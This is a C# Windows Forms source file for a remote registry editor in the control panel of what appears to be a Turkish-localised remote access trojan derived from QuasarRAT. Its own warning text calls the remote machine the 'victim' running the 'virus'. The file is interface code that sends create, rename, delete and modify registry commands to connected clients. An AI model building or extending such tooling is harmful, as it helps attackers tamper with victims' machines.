using System;
using System.Collections.Generic;
using System.Drawing;
using System.Windows.Forms;
using Microsoft.Win32;
using xServer.Kontroller;
using xServer.KuuhakuCekirdek.Ağ;
using xServer.KuuhakuCekirdek.KayıtDefteri;
using xServer.KuuhakuCekirdek.Paketler.ServerPaketleri;

namespace xServer.Formlar
{
    public partial class FrmKayıtDefteriEditor : Form
    {
        private readonly Client _connectClient;
        private readonly object locker = new object();

        public FrmKayıtDefteriEditor(Client c)
        {
            _connectClient = c;
            _connectClient.Value.FrmRe = this;

            InitializeComponent();
        }

        #region Popup actions

        public void ShowErrorMessage(string errorMsg)
        {
            Invoke(
                (MethodInvoker)
                    delegate { MessageBox.Show(errorMsg, "Hata", MessageBoxButtons.OK, MessageBoxIcon.Error); });
        }

        #endregion

        #region ToolStrip Helpfunctions

        public void SetDeleteAndRename(bool enable)
        {
            deleteToolStripMenuItem.Enabled = enable;
            renameToolStripMenuItem.Enabled = enable;
            deleteToolStripMenuItem2.Enabled = enable;
            renameToolStripMenuItem2.Enabled = enable;
        }

        #endregion

        #region Help function

        private Form GetEditForm(string keyPath, RegValueData value, RegistryValueKind valueKind)
        {
            switch (valueKind)
            {
                case RegistryValueKind.String:
                case RegistryValueKind.ExpandString:
                    return new FrmStringEdit(keyPath, value, _connectClient);
                case RegistryValueKind.DWord:
                case RegistryValueKind.QWord:
                    return new FrmWordEdit(keyPath, value, _connectClient);
                case RegistryValueKind.MultiString:
                    return new FrmÇokluStringEdit(keyPath, value, _connectClient);
                case RegistryValueKind.Binary:
                    return new FrmBinaryEdit(keyPath, value, _connectClient);
                default:
                    return null;
            }
        }

        #endregion

        #region Constants

        private const string PRIVILEGE_WARNING =
            "Kurban virüsü yönetici olarak kullanmıyor bu yüzden Aç, Oluştur, Sil, Yeniden Adlandır gibi fonksiyonlar doğru çalışmayabilir.";

        private const string DEFAULT_REG_VALUE = "(Default)";

        #endregion

        #region Main Form

        private void FrmRegistryEditor_Load(object sender, EventArgs e)
        {
            if (_connectClient.Value.HesapTürü != "Admin")
            {
                string msg = PRIVILEGE_WARNING;
                string caption = "Uyarı!";
                MessageBox.Show(msg, caption, MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }

            new DoLoadRegistryKey(null).Execute(_connectClient);

            lstRegistryKeys.ListViewItemSorter = new RegistryValueListItemComparer();
        }

        private void FrmRegistryEditor_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (_connectClient.Value != null)
                _connectClient.Value.FrmRe = null;
        }

        #endregion

        #region TreeView Helperfunctions

        private void AddRootKey(RegSeekerMatch match)
        {
            TreeNode node = CreateNode(match.Key, match.Key, match.Data);
            node.Nodes.Add(new TreeNode());
            tvRegistryDirectory.Nodes.Add(node);
        }

        private TreeNode CreateNode(string key, string text, object tag)
        {
            return new TreeNode
            {
                Text = text,
                Name = key,
                Tag = tag
            };
        }

        public void AddKeysToTree(string rootName, RegSeekerMatch[] matches)
        {
            if (string.IsNullOrEmpty(rootName))
            {
                tvRegistryDirectory.Invoke((MethodInvoker)delegate
                {
                    tvRegistryDirectory.BeginUpdate();

                    foreach (var match in matches)
                    {
                        AddRootKey(match);
                    }

                    tvRegistryDirectory.SelectedNode = tvRegistryDirectory.Nodes[0];

                    tvRegistryDirectory.EndUpdate();
                });
            }
            else
            {
                TreeNode parent = GetTreeNode(rootName);

                if (parent != null)
                {
                    tvRegistryDirectory.Invoke((MethodInvoker)delegate
                    {
                        tvRegistryDirectory.BeginUpdate();

                        foreach (var match in matches)
                        {
                            TreeNode node = CreateNode(match.Key, match.Key, match.Data);
                            if (match.HasSubKeys)
                                node.Nodes.Add(new TreeNode());

                            parent.Nodes.Add(node);
                        }

                        parent.Expand();
                        tvRegistryDirectory.EndUpdate();
                    });
                }
            }
        }

        public void AddKeyToTree(string rootKey, RegSeekerMatch match)
        {
            TreeNode parent = GetTreeNode(rootKey);

            tvRegistryDirectory.Invoke((MethodInvoker)delegate
            {
                TreeNode node = CreateNode(match.Key, match.Key, match.Data);
                if (match.HasSubKeys)
                    node.Nodes.Add(new TreeNode());

                parent.Nodes.Add(node);

                if (!parent.IsExpanded)
                {
                    tvRegistryDirectory.SelectedNode = parent;
                    tvRegistryDirectory.AfterExpand += this.specialCreateRegistryKey_AfterExpand;
                    parent.Expand();
                }
                else
                {
                    tvRegistryDirectory.SelectedNode = node;
                    tvRegistryDirectory.LabelEdit = true;
                    node.BeginEdit();
                }
            });
        }

        public void RemoveKeyFromTree(string rootKey, string subKey)
        {
            TreeNode parent = GetTreeNode(rootKey);

            if (parent.Nodes.ContainsKey(subKey))
            {
                tvRegistryDirectory.Invoke((MethodInvoker)delegate { parent.Nodes.RemoveByKey(subKey); });
            }
        }

        public void RenameKeyFromTree(string rootKey, string oldName, string newName)
        {
            TreeNode parent = GetTreeNode(rootKey);

            if (parent.Nodes.ContainsKey(oldName))
            {
                int index = parent.Nodes.IndexOfKey(oldName);

                tvRegistryDirectory.Invoke((MethodInvoker)delegate
                {
                    parent.Nodes[index].Text = newName;
                    parent.Nodes[index].Name = newName;
                    if (tvRegistryDirectory.SelectedNode == parent.Nodes[index])
                        tvRegistryDirectory.SelectedNode = null;

                    tvRegistryDirectory.SelectedNode = parent.Nodes[index];
                });
            }
        }

        private TreeNode GetTreeNode(string path)
        {
            string[] nodePath = null;
            if (path.Contains("\\"))
            {
                nodePath = path.Split(new char[] { '\\' }, StringSplitOptions.RemoveEmptyEntries);

                if (nodePath.Length < 2)
                    return null;
            }
            else
            {
                nodePath = new string[] { path };
            }

            TreeNode lastNode = null;

            if (tvRegistryDirectory.Nodes.ContainsKey(nodePath[0]))
            {
                lastNode = tvRegistryDirectory.Nodes[nodePath[0]];
            }
            else
            {
                return null;
            }

            for (int i = 1; i < nodePath.Length; i++)
            {
                if (lastNode.Nodes.ContainsKey(nodePath[i]))
                {
                    lastNode = lastNode.Nodes[nodePath[i]];
                }
                else
                {
                    return null;
                }
            }
            return lastNode;
        }

        #endregion

        #region ListView Helpfunctions

        public void AddValueToList(string keyPath, RegValueData value)
        {
            TreeNode key = GetTreeNode(keyPath);

            if (key != null)
            {
                lstRegistryKeys.Invoke((MethodInvoker)delegate
                {
                    List<RegValueData> ValuesFromNode = null;
                    if (key.Tag != null && key.Tag.GetType() == typeof(List<RegValueData>))
                    {
                        ValuesFromNode = (List<RegValueData>)key.Tag;
                        ValuesFromNode.Add(value);
                    }
                    else
                    {
                        ValuesFromNode = new List<RegValueData>();
                        ValuesFromNode.Add(value);
                        key.Tag = ValuesFromNode;
                    }
                    lstRegistryKeys.Sorting = SortOrder.None;

                    if (tvRegistryDirectory.SelectedNode == key)
                    {
                        RegistryValueLstItem item = new RegistryValueLstItem(value.Name, value.GetKindAsString(), value.GetDataAsString());
                        lstRegistryKeys.SelectedIndices.Clear();
                        lstRegistryKeys.Items.Add(item);
                        item.Selected = true;
                        lstRegistryKeys.LabelEdit = true;
                        item.BeginEdit();
                    }
                    else
                    {
                        tvRegistryDirectory.SelectedNode = key;
                    }
                });
            }
        }

        public void DeleteValueFromList(string keyPath, string valueName)
        {
            TreeNode key = GetTreeNode(keyPath);

            if (key != null)
            {
                lstRegistryKeys.Invoke((MethodInvoker)delegate
                {
                    List<RegValueData> ValuesFromNode = null;
                    if (key.Tag != null && key.Tag.GetType() == typeof(List<RegValueData>))
                    {
                        ValuesFromNode = (List<RegValueData>)key.Tag;
                        ValuesFromNode.RemoveAll(value => value.Name == valueName);
                    }
                    else
                    {
                        key.Tag = new List<RegValueData>();
                    }

                    if (tvRegistryDirectory.SelectedNode == key)
                    {
                        valueName = string.IsNullOrEmpty(valueName) ? DEFAULT_REG_VALUE : valueName;
                        lstRegistryKeys.Items.RemoveByKey(valueName);
                    }
                    else
                    {
                        tvRegistryDirectory.SelectedNode = key;
                    }
                });
            }
        }

        public void RenameValueFromList(string keyPath, string oldName, string newName)
        {
            TreeNode key = GetTreeNode(keyPath);

            if (key != null)
            {
                lstRegistryKeys.Invoke((MethodInvoker)delegate
                {
                    if (key.Tag != null && key.Tag.GetType() == typeof(List<RegValueData>))
                    {
                        List<RegValueData> ValuesFromNode = (List<RegValueData>)key.Tag;
                        var value = ValuesFromNode.Find(item => item.Name == oldName);
                        value.Name = newName;

                        if (tvRegistryDirectory.SelectedNode == key)
                        {
                            var index = lstRegistryKeys.Items.IndexOfKey(oldName);
                            if (index != -1)
                            {
                                RegistryValueLstItem valueItem = (RegistryValueLstItem)lstRegistryKeys.Items[index];
                                valueItem.RegName = newName;
                            }
                        }
                        else
                        {
                            tvRegistryDirectory.SelectedNode = key;
                        }
                    }
                });
            }
        }

        public void ChangeValueFromList(string keyPath, RegValueData value)
        {
            TreeNode key = GetTreeNode(keyPath);

            if (key != null)
            {
                lstRegistryKeys.Invoke((MethodInvoker)delegate
                {
                    if (key.Tag != null && key.Tag.GetType() == typeof(List<RegValueData>))
                    {
                        List<RegValueData> ValuesFromNode = (List<RegValueData>)key.Tag;
                        var regValue = ValuesFromNode.Find(item => item.Name == value.Name);
                        regValue.Data = value.Data;

                        if (tvRegistryDirectory.SelectedNode == key)
                        {
                            string name = string.IsNullOrEmpty(value.Name) ? DEFAULT_REG_VALUE : value.Name;
                            var index = lstRegistryKeys.Items.IndexOfKey(name);
                            if (index != -1)
                            {
                                RegistryValueLstItem valueItem = (RegistryValueLstItem)lstRegistryKeys.Items[index];
                                valueItem.Data = value.GetDataAsString();
                            }
                        }
                        else
                        {
                            tvRegistryDirectory.SelectedNode = key;
                        }
                    }
                });
            }
        }

        private void UpdateLstRegistryKeys(TreeNode node)
        {
            selectedStripStatusLabel.Text = node.FullPath;

            List<RegValueData> ValuesFromNode = null;
            if (node.Tag != null && node.Tag.GetType() == typeof(List<RegValueData>))
            {
                ValuesFromNode = (List<RegValueData>)node.Tag;
            }

            PopulateLstRegistryKeys(ValuesFromNode);
        }

        private void PopulateLstRegistryKeys(List<RegValueData> values)
        {
            lstRegistryKeys.Items.Clear();

            if (values != null && values.Count > 0)
            {
                foreach (var value in values)
                {
                    var item = new RegistryValueLstItem(value.Name, value.GetKindAsString(), value.GetDataAsString());
                    lstRegistryKeys.Items.Add(item);
                }
            }
        }

        #endregion

        #region tvRegistryDirectory Action

        private void tvRegistryDirectory_AfterLabelEdit(object sender, NodeLabelEditEventArgs e)
        {
            if (e.Label != null)
            {
                e.CancelEdit = true;

                if (e.Label.Length > 0)
                {
                    if (e.Node.Parent.Nodes.ContainsKey(e.Label))
                    {
                        MessageBox.Show("Geçersiz Etiet. \nBu Etiket Zaten Kullanımda", "Warning",
                            MessageBoxButtons.OK, MessageBoxIcon.Warning);
                        e.Node.BeginEdit();
                    }
                    else
                    {
                        new DoRenameRegistryKey(e.Node.Parent.FullPath, e.Node.Name, e.Label).Execute(_connectClient);
                        tvRegistryDirectory.LabelEdit = false;
                    }
                }
                else
                {
                    MessageBox.Show("Geçersiz Etiket. \nEtiket Boş Olamaz", "Uyarı", MessageBoxButtons.OK,
                        MessageBoxIcon.Warning);
                    e.Node.BeginEdit();
                }
            }
            else
            {
                tvRegistryDirectory.LabelEdit = false;
            }
        }

        private void tvRegistryDirectory_BeforeExpand(object sender, TreeViewCancelEventArgs e)
        {
            TreeNode parentNode = e.Node;

            if (string.IsNullOrEmpty(parentNode.FirstNode.Name))
            {
                tvRegistryDirectory.SuspendLayout();
                parentNode.Nodes.Clear();

                new DoLoadRegistryKey(parentNode.FullPath).Execute(_connectClient);

                tvRegistryDirectory.ResumeLayout();
                e.Cancel = true;
            }
        }

        private void tvRegistryDirectory_NodeMouseClick(object sender, TreeNodeMouseClickEventArgs e)
        {
            if (tvRegistryDirectory.SelectedNode != e.Node)
            {
                tvRegistryDirectory.SelectedNode = e.Node;
                lstRegistryKeys.Sorting = SortOrder.Ascending;
            }

            SetDeleteAndRename(tvRegistryDirectory.SelectedNode.Parent != null);

            if (e.Button == MouseButtons.Right)
            {
                Point pos = new Point(e.X, e.Y);
                tv_ContextMenuStrip.Show(tvRegistryDirectory, pos);
            }
        }

        private void tvRegistryDirectory_BeforeSelect(object sender, TreeViewCancelEventArgs e)
        {
            if (e.Node != null)
            {
                UpdateLstRegistryKeys(e.Node);
            }
        }

        private void tvRegistryDirectory_KeyUp(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Delete)
            {
                deleteRegistryKey_Click(this, e);
            }
        }

        #endregion

        #region MenuStrip Action

        private void menuStripExit_Click(object sender, EventArgs e)
        {
            Close();
        }

        private void menuStripDelete_Click(object sender, EventArgs e)
        {
            if (tvRegistryDirectory.Focused)
            {
                deleteRegistryKey_Click(this, e);
            }
            else if (lstRegistryKeys.Focused)
            {
                deleteRegistryValue_Click(this, e);
            }
        }

        private void menuStripRename_Click(object sender, EventArgs e)
        {
            if (tvRegistryDirectory.Focused)
            {
                renameRegistryKey_Click(this, e);
            }
            else if (lstRegistryKeys.Focused)
            {
                renameRegistryValue_Click(this, e);
            }
        }

        #endregion

        #region lstRegistryKeys action

        private void lstRegistryKeys_MouseClick(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                Point pos = new Point(e.X, e.Y);
                if (lstRegistryKeys.GetItemAt(pos.X, pos.Y) == null)
                {
                    lst_ContextMenuStrip.Show(lstRegistryKeys, pos);
                }
                else
                {
                    selectedItem_ContextMenuStrip.Show(lstRegistryKeys, pos);
                }
            }
        }

        private void lstRegistryKeys_AfterLabelEdit(object sender, LabelEditEventArgs e)
        {
            if (e.Label != null && tvRegistryDirectory.SelectedNode != null)
            {
                e.CancelEdit = true;
                int index = e.Item;

                if (e.Label.Length > 0)
                {
                    if (lstRegistryKeys.Items.ContainsKey(e.Label))
                    {
                        MessageBox.Show("Geçersiz Etiket. \nBu Etiket zaten kullanımda.", "Uyarı",
                            MessageBoxButtons.OK, MessageBoxIcon.Warning);
                        lstRegistryKeys.Items[index].BeginEdit();
                        return;
                    }

                    new DoRenameRegistryValue(tvRegistryDirectory.SelectedNode.FullPath,
                        lstRegistryKeys.Items[index].Name, e.Label).Execute(_connectClient);

                    lstRegistryKeys.LabelEdit = false;
                }
                else
                {
                    MessageBox.Show("Geçersiz Etiket. \nEtiket boş olamaz.", "Uyarı", MessageBoxButtons.OK,
                        MessageBoxIcon.Warning);
                    lstRegistryKeys.Items[index].BeginEdit();
                }
            }
            else
            {
                lstRegistryKeys.LabelEdit = false;
            }
        }

        private void lstRegistryKeys_ItemSelectionChanged(object sender, ListViewItemSelectionChangedEventArgs e)
        {
            modifyToolStripMenuItem.Enabled = lstRegistryKeys.SelectedItems.Count == 1;
            modifyToolStripMenuItem1.Enabled = lstRegistryKeys.SelectedItems.Count == 1;
            modifyBinaryDataToolStripMenuItem.Enabled = lstRegistryKeys.SelectedItems.Count == 1;
            modifyBinaryDataToolStripMenuItem1.Enabled = lstRegistryKeys.SelectedItems.Count == 1;
            renameToolStripMenuItem1.Enabled = lstRegistryKeys.SelectedItems.Count == 1 &&
                                               e.Item.Name != DEFAULT_REG_VALUE;
            renameToolStripMenuItem2.Enabled = lstRegistryKeys.SelectedItems.Count == 1 &&
                                               e.Item.Name != DEFAULT_REG_VALUE;

            deleteToolStripMenuItem2.Enabled = lstRegistryKeys.SelectedItems.Count > 0;
        }

        private void lstRegistryKeys_KeyUp(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Delete)
            {
                deleteRegistryValue_Click(this, e);
            }
        }

        private void lstRegistryKeys_Enter(object sender, EventArgs e)
        {
            modifyNewtoolStripSeparator.Visible = true;

            modifyToolStripMenuItem1.Visible = true;
            modifyBinaryDataToolStripMenuItem1.Visible = true;
        }

        private void lstRegistryKeys_Leave(object sender, EventArgs e)
        {
            modifyNewtoolStripSeparator.Visible = false;

            modifyToolStripMenuItem1.Visible = false;
            modifyBinaryDataToolStripMenuItem1.Visible = false;
        }

        #endregion

        #region ContextMenu

        private void createNewRegistryKey_Click(object sender, EventArgs e)
        {
            if (tvRegistryDirectory.SelectedNode != null)
            {
                if (!(tvRegistryDirectory.SelectedNode.IsExpanded) && tvRegistryDirectory.SelectedNode.Nodes.Count > 0)
                {
                    tvRegistryDirectory.AfterExpand += createRegistryKey_AfterExpand;
                    tvRegistryDirectory.SelectedNode.Expand();
                }
                else
                {
                    new DoCreateRegistryKey(tvRegistryDirectory.SelectedNode.FullPath).Execute(_connectClient);
                }
            }
        }

        private void deleteRegistryKey_Click(object sender, EventArgs e)
        {
            if (tvRegistryDirectory.SelectedNode != null && tvRegistryDirectory.SelectedNode.Parent != null)
            {
                string msg = "Bu anahtarı ve bunun bütün alt anahtarlarını silmek istediğinize emin misiniz?";
                string caption = "Silmeyi Onayla";
                var answer = MessageBox.Show(msg, caption, MessageBoxButtons.YesNo, MessageBoxIcon.Warning);

                if (answer == DialogResult.Yes)
                {
                    string parentPath = tvRegistryDirectory.SelectedNode.Parent.FullPath;

                    new DoDeleteRegistryKey(parentPath, tvRegistryDirectory.SelectedNode.Name).Execute(_connectClient);
                }
            }
        }

        private void renameRegistryKey_Click(object sender, EventArgs e)
        {
            if (tvRegistryDirectory.SelectedNode != null && tvRegistryDirectory.SelectedNode.Parent != null)
            {
                tvRegistryDirectory.LabelEdit = true;
                tvRegistryDirectory.SelectedNode.BeginEdit();
            }
        }

        #region New Registry Value

        private void createStringRegistryValue_Click(object sender, EventArgs e)
        {
            if (tvRegistryDirectory.SelectedNode != null)
            {
                new DoCreateRegistryValue(tvRegistryDirectory.SelectedNode.FullPath, RegistryValueKind.String).Execute(
                    _connectClient);
            }
        }

        private void createBinaryRegistryValue_Click(object sender, EventArgs e)
        {
            if (tvRegistryDirectory.SelectedNode != null)
            {
                new DoCreateRegistryValue(tvRegistryDirectory.SelectedNode.FullPath, RegistryValueKind.Binary).Execute(
                    _connectClient);
            }
        }

        private void createDwordRegistryValue_Click(object sender, EventArgs e)
        {
            if (tvRegistryDirectory.SelectedNode != null)
            {
                new DoCreateRegistryValue(tvRegistryDirectory.SelectedNode.FullPath, RegistryValueKind.DWord).Execute(
                    _connectClient);
            }
        }

        private void createQwordRegistryValue_Click(object sender, EventArgs e)
        {
            if (tvRegistryDirectory.SelectedNode != null)
            {
                new DoCreateRegistryValue(tvRegistryDirectory.SelectedNode.FullPath, RegistryValueKind.QWord).Execute(
                    _connectClient);
            }
        }

        private void createMultiStringRegistryValue_Click(object sender, EventArgs e)
        {
            if (tvRegistryDirectory.SelectedNode != null)
            {
                new DoCreateRegistryValue(tvRegistryDirectory.SelectedNode.FullPath, RegistryValueKind.MultiString)
                    .Execute(_connectClient);
            }
        }

        private void createExpandStringRegistryValue_Click(object sender, EventArgs e)
        {
            if (tvRegistryDirectory.SelectedNode != null)
            {
                new DoCreateRegistryValue(tvRegistryDirectory.SelectedNode.FullPath, RegistryValueKind.ExpandString)
                    .Execute(_connectClient);
            }
        }

        #endregion

        #region Registry Value edit

        private void deleteRegistryValue_Click(object sender, EventArgs e)
        {
            if (tvRegistryDirectory.SelectedNode != null && lstRegistryKeys.SelectedItems.Count > 0)
            {
                string msg =
                    "Belli kayıt defteri değerlerini silmek sistemde bozulmalara yol açabilir. Kalıcı olarak silmek istediğinizden emin misiniz?";
                string caption = "Silmeyi Onayla";
                var answer = MessageBox.Show(msg, caption, MessageBoxButtons.YesNo, MessageBoxIcon.Warning);

                if (answer == DialogResult.Yes)
                {
                    foreach (var item in lstRegistryKeys.SelectedItems)
                    {
                        if (item.GetType() == typeof(RegistryValueLstItem))
                        {
                            RegistryValueLstItem registyValue = (RegistryValueLstItem)item;
                            new DoDeleteRegistryValue(tvRegistryDirectory.SelectedNode.FullPath, registyValue.RegName)
                                .Execute(_connectClient);
                        }
                    }
                }
            }
        }

        private void renameRegistryValue_Click(object sender, EventArgs e)
        {
            if (tvRegistryDirectory.SelectedNode != null && lstRegistryKeys.SelectedItems.Count == 1)
            {
                if (lstRegistryKeys.SelectedItems[0].Name != DEFAULT_REG_VALUE)
                {
                    lstRegistryKeys.LabelEdit = true;
                    lstRegistryKeys.SelectedItems[0].BeginEdit();
                }
            }
        }

        private void modifyRegistryValue_Click(object sender, EventArgs e)
        {
            if (tvRegistryDirectory.SelectedNode != null && lstRegistryKeys.SelectedItems.Count == 1)
            {
                if (tvRegistryDirectory.SelectedNode.Tag != null &&
                    tvRegistryDirectory.SelectedNode.Tag.GetType() == typeof(List<RegValueData>))
                {
                    string keyPath = tvRegistryDirectory.SelectedNode.FullPath;
                    string name = lstRegistryKeys.SelectedItems[0].Name == DEFAULT_REG_VALUE
                        ? ""
                        : lstRegistryKeys.SelectedItems[0].Name;
                    RegValueData value =
                        ((List<RegValueData>)tvRegistryDirectory.SelectedNode.Tag).Find(item => item.Name == name);

                    using (var frm = GetEditForm(keyPath, value, value.Kind))
                    {
                        if (frm != null)
                            frm.ShowDialog();
                    }
                }
            }
        }

        private void modifyBinaryDataRegistryValue_Click(object sender, EventArgs e)
        {
            if (tvRegistryDirectory.SelectedNode != null && lstRegistryKeys.SelectedItems.Count == 1)
            {
                if (tvRegistryDirectory.SelectedNode.Tag != null &&
                    tvRegistryDirectory.SelectedNode.Tag.GetType() == typeof(List<RegValueData>))
                {
                    string keyPath = tvRegistryDirectory.SelectedNode.FullPath;
                    string name = lstRegistryKeys.SelectedItems[0].Name == DEFAULT_REG_VALUE
                        ? ""
                        : lstRegistryKeys.SelectedItems[0].Name;
                    RegValueData value =
                        ((List<RegValueData>)tvRegistryDirectory.SelectedNode.Tag).Find(item => item.Name == name);

                    using (var frm = GetEditForm(keyPath, value, RegistryValueKind.Binary))
                    {
                        if (frm != null)
                            frm.ShowDialog();
                    }
                }
            }
        }

        #endregion

        #endregion

        #region Handlers

        private void createRegistryKey_AfterExpand(object sender, TreeViewEventArgs e)
        {
            if (e.Node == tvRegistryDirectory.SelectedNode)
            {
                createNewRegistryKey_Click(this, e);

                tvRegistryDirectory.AfterExpand -= createRegistryKey_AfterExpand;
            }
        }

        private void specialCreateRegistryKey_AfterExpand(object sender, TreeViewEventArgs e)
        {
            if (e.Node == tvRegistryDirectory.SelectedNode)
            {
                tvRegistryDirectory.SelectedNode = tvRegistryDirectory.SelectedNode.FirstNode;
                tvRegistryDirectory.LabelEdit = true;

                tvRegistryDirectory.SelectedNode.BeginEdit();
                tvRegistryDirectory.AfterExpand -= specialCreateRegistryKey_AfterExpand;
            }
        }

        #endregion
    }
}